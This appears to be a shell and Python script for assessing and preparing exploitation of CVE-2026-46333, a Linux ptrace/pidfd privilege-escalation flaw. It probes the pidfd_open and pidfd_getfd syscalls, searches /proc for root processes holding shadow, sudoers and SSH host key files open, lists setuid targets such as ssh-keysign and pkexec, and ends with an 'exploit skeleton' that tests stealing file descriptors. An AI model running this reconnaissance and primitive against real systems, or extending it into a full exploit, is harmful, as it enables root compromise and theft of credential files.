# ── CHECK 1: ptrace scope ──
cat /proc/sys/kernel/yama/ptrace_scope
# 0 = fully open (worst) — any process can trace any other
# 1 = restricted (partial protection)
# 2 or 3 = protected

# ── CHECK 2: pidfd syscalls available? (needed for exploit) ──
python3 << 'CHECK'
import ctypes, os

libc = ctypes.CDLL(None)

# SYS_pidfd_open = 434 on x86_64
# SYS_pidfd_getfd = 438 on x86_64
pid = os.getpid()
pidfd = libc.syscall(434, pid, 0)

if pidfd >= 0:
    print(f"[VULNERABLE] pidfd_open works — got fd {pidfd}")
    # Try getfd on own process (safe test)
    fd = libc.syscall(438, pidfd, 1, 0)
    if fd >= 0:
        print(f"[VULNERABLE] pidfd_getfd works — got fd {fd}")
        print("[+] Full CVE-2026-46333 exploit chain is possible")
else:
    print("[-] pidfd_open failed — may not be exploitable")
CHECK

# ── CHECK 3: Target processes with sensitive open FDs ──
# Find root processes that have sensitive files open
ls -la /proc/*/fd/ 2>/dev/null | grep -E "shadow|passwd|sudoers|ssh_host" | head -20

# Find processes we might be able to trace
python3 << 'TARGETS'
import os, glob

targets = []
for pid_dir in glob.glob('/proc/[0-9]*/'):
    try:
        pid = int(pid_dir.split('/')[2])
        # Check status
        with open(f'/proc/{pid}/status') as f:
            status = dict(line.strip().split(':\t', 1) 
                         for line in f if ':\t' in line)
        
        uid = status.get('Uid', '').split()[0]
        name = status.get('Name', 'unknown')
        
        # Check open files
        fds = os.listdir(f'/proc/{pid}/fd') 
        for fd in fds:
            try:
                link = os.readlink(f'/proc/{pid}/fd/{fd}')
                if any(s in link for s in ['shadow','sudoers','ssh_host','secret','key']):
                    print(f"[TARGET] PID={pid} Name={name} UID={uid} FD={fd}→{link}")
                    targets.append((pid, fd, link))
            except: pass
    except: pass

if not targets:
    print("[i] No obvious sensitive FDs found in readable /proc entries")
TARGETS

# ── CHECK 4: Test on ssh-keysign (one of the 4 exploit targets) ──
ls -la /usr/lib/openssh/ssh-keysign
stat /usr/lib/openssh/ssh-keysign
# SUID + owned by root = exploit target confirmed

# ── CHECK 5: pkexec (another exploit target) ──
ls -la /usr/bin/pkexec
dpkg -l policykit-1 2>/dev/null | grep ^ii

# ── EXPLOIT SKELETON (from public PoC logic) ──
python3 << 'EXPLOIT'
import ctypes, os, sys, time

libc = ctypes.CDLL(None)

# Find a process running as root that we can attach to
# (The bug: during credential drop, ptrace window opens)
print("[*] Looking for privilege-dropping root processes...")
print("[*] Target binaries from Qualys PoC: chage, ssh-keysign, pkexec, accounts-daemon")
print("[*] Full exploit available at: github.com/qualys-research/CVE-2026-46333")

# Verify the core primitive works
pid = os.getpid()
pidfd = libc.syscall(434, pid, 0)  # pidfd_open
if pidfd > 0:
    print(f"[+] pidfd_open: WORKS (fd={pidfd})")
    stolen = libc.syscall(438, pidfd, 0, 0)  # steal stdin
    if stolen >= 0:
        print(f"[+] pidfd_getfd: WORKS — full chain exploitable!")
    libc.close(pidfd)
EXPLOIT
